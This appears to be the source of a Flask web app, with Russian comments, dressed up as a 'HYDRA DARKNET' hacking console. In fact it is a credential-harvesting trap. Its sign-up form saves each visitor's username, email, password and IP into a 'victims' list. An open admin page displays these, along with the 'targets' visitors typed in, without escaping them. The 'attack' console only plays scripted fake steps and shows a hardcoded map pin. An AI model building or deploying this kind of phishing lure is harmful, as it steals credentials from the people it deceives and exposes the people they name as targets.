from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_DARKNET_ULTIMATE_2026'

db = {"victims": [], "logs": []}

# --- САМЫЙ МОЩНЫЙ ИНТЕРФЕЙС В ИСТОРИИ ---
DARKNET_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA DARKNET v6.0</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
        .main-container { display: flex; height: 100vh; padding: 10px; gap: 10px; box-sizing: border-box; }
        
        /* Боковая панель (Статистика) */
        .sidebar { width: 250px; border: 1px solid #bc13fe; background: rgba(5,0,10,0.9); padding: 15px; box-shadow: 0 0 15px #bc13fe; }
        .stat-item { font-size: 10px; margin-bottom: 10px; color: #0f0; }
        
        /* Центр (Консоль) */
        .content { flex: 1; display: flex; flex-direction: column; gap: 10px; }
        .terminal { flex: 1; border: 2px solid #bc13fe; background: rgba(0,0,0,0.95); box-shadow: 0 0 30px #bc13fe; padding: 20px; overflow: hidden; position: relative; }
        
        .header { color: #0ff; text-align: center; font-size: 20px; text-shadow: 0 0 10px #0ff; margin-bottom: 15px; border-bottom: 1px dashed #bc13fe; }
        .input-area { display: flex; gap: 10px; margin-bottom: 15px; }
        input { background: transparent; border: 1px solid #0ff; color: #0f0; flex: 1; padding: 10px; outline: none; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
        
        #display { height: 250px; overflow-y: auto; font-size: 12px; color: #0f0; line-height: 1.5; border: 1px solid #333; padding: 10px; }
        #map { height: 150px; border: 1px solid #bc13fe; margin-top: 10px; display: none; }
        
        .radar { width: 100px; height: 100px; border: 1px solid #0f0; border-radius: 50%; position: absolute; right: 20px; top: 60px; opacity: 0.5; }
        .radar-sweep { width: 100%; height: 100%; border-left: 2px solid #0f0; border-radius: 50%; animation: sweep 2s infinite linear; }
        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-container">
        <div class="sidebar">
            <div style="color:#0ff; border-bottom:1px solid #bc13fe; margin-bottom:10px;">[ NODES STATUS ]</div>
            <div class="stat-item">> TOR RELAY: ACTIVE</div>
            <div class="stat-item">> PROXY CHAIN: 4/4</div>
            <div class="stat-item">> CPU LOAD: 88%</div>
            <div class="stat-item">> MINING: 0.0042 BTC/h</div>
            <hr style="border:0; border-top:1px solid #333;">
            <div style="color:#bc13fe; font-size:10px;">[ SYSTEM LOG ]</div>
            <div id="side-log" style="font-size:9px; color:#555;">Initializing...</div>
        </div>

        <div class="content">
            <div class="terminal">
                <div class="radar"><div class="radar-sweep"></div></div>
                <div class="header">// HYDRA DARKNET CORE v6.0 //</div>
                <div class="input-area">
                    <input id="target" placeholder="TARGET (NICK, PHONE, IP, BTC ADDRESS)...">
                    <button class="btn" onclick="startBrute()">LAUNCH</button>
                </div>
                <div id="display">> SYSTEM STANDBY. AWAITING TARGET...</div>
                <div id="map"></div>
            </div>
            <div style="text-align:center;">
                <button class="btn" style="font-size:10px; padding:5px 10px;" onclick="window.location.href='/abupaay_admin'">[ DATABASE ACCESS ]</button>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // MATRIX EFFECT
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const drops = Array(Math.floor(canvas.width/16)).fill(1);
        function draw() {
            ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = '#bc13fe'; ctx.font = '15px monospace';
            drops.forEach((y, i) => {
                const text = String.fromCharCode(Math.random() * 128);
                ctx.fillText(text, i*16, y*16);
                if(y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(draw, 33);

        let map;
        function startBrute() {
            const val = document.getElementById('target').value;
            const disp = document.getElementById('display');
            if(!val) return;

            disp.innerHTML = `<span style="color:#ff0055">[!!!] ИНИЦИАЛИЗАЦИЯ АТАКИ НА: ${val}</span>`;
            
            // Log for Admin
            fetch('/api/log_action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target:val})});

            let steps = [
                "[*] Подключение к TOR-узлам...",
                "[*] Обход Cloudflare DNS...",
                "[*] Инъекция в базу данных соцсетей...",
                "[*] Перехват SMS-шлюза (имитация)...",
                "[+] ДАННЫЕ ПОЛУЧЕНЫ. ФОРМИРОВАНИЕ ОТЧЕТА..."
            ];

            let i = 0;
            const timer = setInterval(() => {
                disp.innerHTML += `<br>> ${steps[i]}`;
                disp.scrollTop = disp.scrollHeight;
                i++;
                if(i >= steps.length) {
                    clearInterval(timer);
                    showFinal(val);
                }
            }, 800);
        }

        function showFinal(val) {
            const disp = document.getElementById('display');
            const mapDiv = document.getElementById('map');
            mapDiv.style.display = 'block';
            if(!map) {
                map = L.map('map').setView([41.311081, 69.240562], 13);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
            }
            L.marker([41.311081, 69.240562]).addTo(map).bindPopup('TARGET_LOCATED').openPopup();
            
            disp.innerHTML += `<br><br><span style="color:#0ff">РЕЗУЛЬТАТ: Найдена связь с 14 аккаунтами. <a href="https://instagram.com/${val}" target="_blank" style="color:#fff">ОТКРЫТЬ ДОСЬЕ</a></span>`;
        }

        setInterval(() => {
            const logs = ["GET /api/v1/trace", "POST /payload", "SYN Flood detected", "Bypassing Auth..."];
            document.getElementById('side-log').innerHTML = logs[Math.floor(Math.random()*logs.length)];
        }, 2000);
    </script>
</body>
</html>
"""

# --- BACKEND (БЕЗ ИЗМЕНЕНИЙ В ЛОГИКЕ) ---
@app.route('/')
def home():
    if 'reg' not in session:
        return f"<!DOCTYPE html><html><head>{DARKNET_UI.split('</style>')[0]}</style></head><body style='display:flex; justify-content:center; align-items:center;'><div style='border:2px solid #bc13fe; padding:40px; text-align:center; background:#050505; box-shadow:0 0 20px #bc13fe;'><h1>// HYDRA ENTRANCE //</h1><form action='/api/reg' method='POST'><input name='u' placeholder='USER' required><br><input name='e' placeholder='EMAIL' required><br><input name='p' type='password' placeholder='PASS' required><br><button style='background:#bc13fe; color:#fff; border:none; padding:10px 20px; cursor:pointer; font-weight:bold; margin-top:10px;'>DECRYPT ACCESS</button></form></div></body></html>"
    return render_template_string(DARKNET_UI)

@app.route('/api/reg', methods=['POST'])
def reg():
    db['victims'].append({"u": request.form.get('u'), "e": request.form.get('e'), "p": request.form.get('p'), "ip": request.remote_addr, "time": datetime.now().strftime("%H:%M:%S")})
    session['reg'] = True
    return redirect('/')

@app.route('/api/log_action', methods=['POST'])
def log_act():
    db['logs'].append({"target": request.json['target'], "time": datetime.now().strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/abupaay_admin')
def admin():
    u_list = "".join([f"<tr><td>{x['u']}</td><td>{x['e']}</td><td>{x['p']}</td><td>{x['ip']}</td><td>{x['time']}</td></tr>" for x in db['victims']])
    l_list = "".join([f"<tr><td>{x['target']}</td><td>{x['time']}</td></tr>" for x in db['logs']])
    return f"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>HYDRA DARKNET ADMIN</h1><h3>USERS CAPTURED</h3><table border='1' width='100%'><tr><th>User</th><th>Email</th><th>Pass</th><th>IP</th><th>Time</th></tr>{u_list}</table><h3>SEARCH LOGS</h3><table border='1' width='100%'><tr><th>Target</th><th>Time</th></tr>{l_list}</table><br><a href='/' style='color:#bc13fe'>BACK</a></body></html>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
